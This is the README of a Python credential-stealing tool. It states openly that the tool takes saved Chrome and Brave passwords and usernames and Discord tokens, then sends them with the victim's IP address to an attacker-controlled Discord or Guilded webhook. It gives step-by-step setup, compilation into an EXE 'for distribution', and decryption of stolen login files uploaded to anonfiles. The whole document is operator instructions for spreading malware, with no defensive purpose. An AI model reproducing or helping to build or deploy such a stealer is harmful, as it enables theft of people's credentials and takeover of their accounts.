A program made in python for stealing passwords and usernames from Google Chrome/Brave and tokenlog the user's discord.
It will send a message in a webhook, with all the tokens, login info, ip and so on.

1. Download the latest release.
2. Install the requirements:
   ```
   pip install requests
   pip install pywin32
   pip install pycryptodome
   ```
3. Make a webhook in a discord server/guilded.gg server.
4. Paste the webhook url into the variable at line 29.
5. Run the code or something.

## Compile for distribution (EXE)
1. Install pyinstaller:
   ```
   pip install pyinstaller
   ```
2. Make a webhook on discord or guilded and copy the url.
3. Paste the webhook url into the variable at line 29.
4. Run the file "build.py"
5. When its done, go into the "dist" directory and exe should be in there.

## Decrypt the user data from the .enc file
You can turn off encryption in main.py by setting encrypt_loginInfo to False in the Config section(not recommended).
1. Download the login info file from the anonfiles url, and put it in the directory of Backdoor Machine.
2. Run decrypt.py, and you will get prompted for the path to the file you just downloaded.
3. Type the name of the file you downloaded(for instance, bravelogin.enc), and press enter.
4. Then on the next prompt, paste in the decryption key for the file(found in the embed).
5. It will then output a file with the pure login information from google chrome or brave browser.
